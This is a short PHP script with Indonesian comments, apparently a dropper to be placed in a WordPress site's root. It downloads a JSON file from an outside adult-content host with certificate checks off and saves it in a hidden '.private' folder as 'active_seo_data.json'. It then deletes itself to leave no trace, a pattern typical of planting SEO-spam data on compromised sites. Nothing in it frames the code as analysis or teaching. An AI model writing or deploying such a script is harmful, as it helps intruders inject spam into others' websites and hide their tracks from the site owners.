<?php
// File: x.php (Simpan di root WordPress Anda)

// 1. Dapatkan nama file dari URL (contoh: x.php?test.json)
$json_to_download = $_SERVER['QUERY_STRING'];

if (empty($json_to_download) || !preg_match('/\.json$/i', $json_to_download)) {
    die('Error: Tentukan file. Contoh: x.php?test.json');
}

$remote_json_url = 'https://player.javpornsub.net/content/' . $json_to_download;

// 2. [PERUBAHAN] Tentukan path folder & file
// dirname(__FILE__) akan mendapatkan path folder saat ini (misal: /var/www/html)
$cache_dir = dirname(__FILE__) . '/.private';
$local_save_path = $cache_dir . '/active_seo_data.json'; 

// 3. [PERUBAHAN] Buat folder .private jika tidak ada
if (!is_dir($cache_dir)) {
    // 0755 adalah izin folder yang umum
    if (!@mkdir($cache_dir, 0755, true)) {
        die('Error: Gagal membuat folder .private. Periksa izin "write" di folder root Anda.');
    }
}

// 4. Logika Unduh (file_get_contents + cURL Fallback)
$code = false;
if (ini_get('allow_url_fopen')) {
    $code = @file_get_contents($remote_json_url);
}
if ($code === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_json_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $code = curl_exec($ch);
    curl_close($ch);
}

// 5. Tampilkan Notifikasi Hasil
header('Content-Type: text/plain');
if ($code !== false && !empty($code)) {
    // Berhasil mengunduh. Simpan ke path cache lokal
    @file_put_contents($local_save_path, $code);
    
    echo "NOTIFIKASI: BERHASIL.\n\n";
    echo "File '" . $json_to_download . "' telah diunduh.\n";
    echo "Disimpan secara LOKAL di: " . $local_save_path . "\n";
    
    // 6. HAPUS DIRI SENDIRI (Self-Destruct)
    @unlink(__FILE__);
    echo "File 'x.php' ini telah dihapus.";

} else {
    echo "NOTIFIKASI: GAGAL.\n\n";
    echo "Gagal mengunduh file dari: " . $remote_json_url . "\n";
    // File x.php tidak dihapus agar bisa dicoba lagi
}

exit;
?>
